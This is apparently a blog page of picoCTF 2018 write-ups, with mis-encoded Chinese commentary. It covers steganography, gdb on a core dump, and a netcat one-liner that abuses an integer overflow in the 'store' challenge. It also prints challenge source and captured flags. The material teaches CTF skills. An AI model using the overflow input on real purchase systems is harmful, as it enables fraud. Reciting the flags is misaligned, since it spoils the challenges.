'4', '4', '10:45:00', '10409', '5', '5', '11:45:00', '12732', '6', '6', '14:15:00', '10538', '7', '7', '16:15:00', '10233', '8', '8', '17:30:00', '10839', '9', '9', '20:15:00', '11936', '10', '10', '20:30:00', '9898', '11', '11', '21:45:00', '9653', '12', '12', '22:30:00', '10252', '13', '13', '23:15:00', '9619']</span></span><br><span class="line"><span class="comment"># 0 1 2 9 Correct!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Great job. You've earned the flag: picoCTF&#123;w4y_0ut_940df760&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] Closed connection to 2018shell2.picoctf.com port 39410</span></span><br><span class="line"><span class="comment"># [Finished in 3.6s]</span></span><br></pre></td></tr></table></figure><h2 id="What‚Äôs-My-Name"><a href="#What‚Äôs-My-Name" class="headerlink" title="What‚Äôs My Name?"></a>What‚Äôs My Name?</h2><p><code>picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}</code>  </p><p><img src="1538368152075.png" alt="1538368152075"></p><h2 id="Malware-Shops"><a href="#Malware-Shops" class="headerlink" title="Malware Shops"></a>Malware Shops</h2><p>ÈôÑ‰ª∂Ë≤å‰ººÊúâÈóÆÈ¢òÔºåÁàÜÁ†¥Âá∫Á¨¨‰∏Ä‰∏™Á≠îÊ°àÊòØ5ÔºåÁ¨¨‰∫å‰∏™ÈöèÊâã‰∫§‰∏Ä‰∏ãflagÂ∞±Âá∫Êù•‰∫Ü„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nc 2018shell2.picoctf.com 57920</span><br><span class="line">You<span class="string">'ll need to consult the file `clusters.png` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many attackers created the malware in this dataset?</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file'</span>s <span class="built_in">hash</span>.</span><br><span class="line">       <span class="built_in">hash</span>  jmp_count  add_count</span><br><span class="line">0  87847bfc       32.0       29.0</span><br><span class="line">1  7eeed4b3       34.0       34.0</span><br><span class="line">2  ad5e4ce0       21.0       64.0</span><br><span class="line">3  628e79cf       14.0       26.0</span><br><span class="line">4  b5e53809       11.0       35.0</span><br><span class="line">5  ebaf5ccd       15.0       13.0</span><br><span class="line">6  94ad3582       37.0       10.0</span><br><span class="line">7  42f1d364       23.0       68.0</span><br><span class="line">8  93827b93       11.0       38.0</span><br><span class="line">9  c08300fe       41.0       10.0</span><br><span class="line">7eeed4b3</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Great job. You<span class="string">'ve earned the flag: picoCTF&#123;w4y_0ut_0915ebc6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="LoadSomeBits"><a href="#LoadSomeBits" class="headerlink" title="LoadSomeBits"></a>LoadSomeBits</h2><p>ÊúÄ‰ΩéÊúâÊïà‰ΩçÈöêÂÜôÔºåÈúÄË¶ÅfuzzËµ∑ÂßãÂÅèÁßª„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat lsb.py</span></span><br><span class="line">import binascii</span><br><span class="line">lsb=<span class="string">''</span>.join(map(lambda x:str(ord(x)&amp;1),open(<span class="string">'pico2018-special-logo.bmp'</span>,<span class="string">'rb'</span>).<span class="built_in">read</span>()))</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> range(16):</span><br><span class="line">        tmp=lsb[offset:]</span><br><span class="line">        tmps=<span class="string">''</span>.join(chr(int(tmp[i:i+8],2)) <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(tmp),8))</span><br><span class="line">        <span class="keyword">if</span>  <span class="string">'pico'</span> <span class="keyword">in</span> tmps:</span><br><span class="line">                <span class="built_in">print</span> tmps</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python lsb.py | strings | grep -o picoCTF&#123;.*&#125;</span></span><br><span class="line">picoCTF&#123;st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693&#125;</span><br></pre></td></tr></table></figure><h2 id="core"><a href="#core" class="headerlink" title="core"></a>core</h2><p>core fileÊàñËÄÖcore dunpÊòØ‰∏Ä‰∏™‰øùÂ≠òËøõÁ®ãËøêË°åÊó∂ÂÜÖÂ≠òÈïúÂÉèÂíåËøõÁ®ãÁä∂ÊÄÅÔºàÂ¶ÇÂØÑÂ≠òÂô®ÁöÑÂÄºÁ≠âÔºâÁöÑÊñá‰ª∂„ÄÇÊ≤°ÊåÇË∞ÉËØïÂô®ÁöÑÁ®ãÂ∫èÂ¥©Ê∫ÉÊó∂‰∏ÄËà¨‰ºöËá™Âä®‰∫ßÁîücoreÊñá‰ª∂Áî®‰∫épost-mortem debugging„ÄÇÂèØ‰ª•‰ΩøÁî® <code>gdb  program [core dump]</code> ÂºÄÂßãË∞ÉËØï„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080487ec &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x080487f0 &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x080487f3 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x080487f6 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x080487f7 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x080487f9 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x080487fa &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x080487fd &lt;+17&gt;:    call   0x80485bb &lt;load_strings&gt;</span><br><span class="line">   0x08048802 &lt;+22&gt;:    call   0x80487c1 &lt;print_flag&gt;</span><br><span class="line">   0x08048807 &lt;+27&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804880c &lt;+32&gt;:    add    esp,0x4</span><br><span class="line">   0x0804880f &lt;+35&gt;:    pop    ecx</span><br><span class="line">   0x08048810 &lt;+36&gt;:    pop    ebp</span><br><span class="line">   0x08048811 &lt;+37&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048814 &lt;+40&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas print_flag</span><br><span class="line">Dump of assembler code for function print_flag:</span><br><span class="line">=&gt; 0x080487c1 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x080487c2 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x080487c4 &lt;+3&gt;:     sub    esp,0x18</span><br><span class="line">   0x080487c7 &lt;+6&gt;:     mov    DWORD PTR [ebp-0xc],0x539</span><br><span class="line">   0x080487ce &lt;+13&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080487d1 &lt;+16&gt;:    mov    eax,DWORD PTR [eax*4+0x804a080]</span><br><span class="line">   0x080487d8 &lt;+23&gt;:    sub    esp,0x8</span><br><span class="line">   0x080487db &lt;+26&gt;:    push   eax ;flagÂ≠óÁ¨¶‰∏≤ÁöÑÂú∞ÂùÄ‰øùÂ≠òÂú®eax‰∏≠</span><br><span class="line">   0x080487dc &lt;+27&gt;:    push   0x804894c</span><br><span class="line">   0x080487e1 &lt;+32&gt;:    call   0x8048410 &lt;printf@plt&gt;</span><br><span class="line">   0x080487e6 &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x080487e9 &lt;+40&gt;:    nop</span><br><span class="line">   0x080487ea &lt;+41&gt;:    leave</span><br><span class="line">   0x080487eb &lt;+42&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) x/sb *(0x804a080+4*0x539)</span><br><span class="line">0x80610f0:      &quot;c96bd0fa2da5c0853cf12c4f93fce288&quot;s</span><br></pre></td></tr></table></figure><p><code>picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}</code>ÊØè‰∏™‰∫∫ÁöÑÁ≠îÊ°àÊòØ‰∏çÂêåÁöÑ„ÄÇ</p><h1 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h1><h2 id="absolutely-relative"><a href="#absolutely-relative" class="headerlink" title="absolutely relative"></a>absolutely relative</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> yes_len 3</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *yes = <span class="string">"yes"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="keyword">char</span> permission[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE * file;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">"/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, flag)!=EOF)</span><br><span class="line">    fclose(file);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    file = fopen( <span class="string">"./permission.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, permission);</span><br><span class="line">        &#125;</span><br><span class="line">        permission[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(permission, yes, yes_len)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You have the write permissions.\n%s\n"</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You do not have sufficient permissions to view the flag.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1539439034675.png" alt="1539439034675"></p><p><code>picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}</code> </p><h2 id="Aca-Shell-A"><a href="#Aca-Shell-A" class="headerlink" title="Aca-Shell-A"></a>Aca-Shell-A</h2><p><img src="1539139814957.png" alt="1539139814957"></p><p><img src="1539139848050.png" alt="1539139848050"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CrUsHeD_It_17ab99f5&#125;</span><br></pre></td></tr></table></figure><h2 id="in-out-error"><a href="#in-out-error" class="headerlink" title="in out error"></a>in out error</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Please may I have the flag?"</span> | ./<span class="keyword">in</span>-out-error  &gt; ~/result.txt</span><br><span class="line"><span class="comment">#picoCTF&#123;p1p1ng_1S_4_7h1ng_f37fb67e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="learn-gdb"><a href="#learn-gdb" class="headerlink" title="learn gdb"></a>learn gdb</h2><p><code>picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}</code> </p><p><img src="1538828295272.png" alt="1538828295272"></p><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># curl https:<span class="comment">//2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the Store App V1.0\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"World's Most Secure Purchasing App\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[1] Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[2] Buy Stuff\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[3] Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Current Auctions\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[1] I Can't Believe its not a Flag!\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[2] Real Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Imitation Flags cost 1000 each, how many would you like?\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">1000</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nYour total cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour new balance: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds\n"</span>);</span><br><span class="line">                    &#125;   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"A genuine Flag costs 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to purchase"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;                </span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS:\n"</span>);</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êï¥Êï∞Ê∫¢Âá∫„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "2\n1\n"+str(((1100-100001)+2**32)/1000)+"\n2\n2\n1\n3\n"'</span> | nc 2018shell2.picoctf.com 43581 | grep pico</span><br><span class="line"><span class="comment"># Enter 1 to purchaseYOUR FLAG IS: picoCTF&#123;numb3r3_4r3nt_s4f3_6bd13a8c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM_LEN 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOTSTREAK 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_WINS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_BILLION 1000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SIZE 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SPINS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SLOWS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_WIN_MSGS 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_LOSE_MSGS 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> cash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> wins = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//Âà§Êñ≠Â≠óÁ¨¶ÊòØÂê¶ÊòØÊï∞Â≠ó,ÊòØÂàôËøîÂõûÁúü„ÄÇ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_digit</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0'</span> &lt;= c &amp;&amp; c &lt;= <span class="string">'9'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 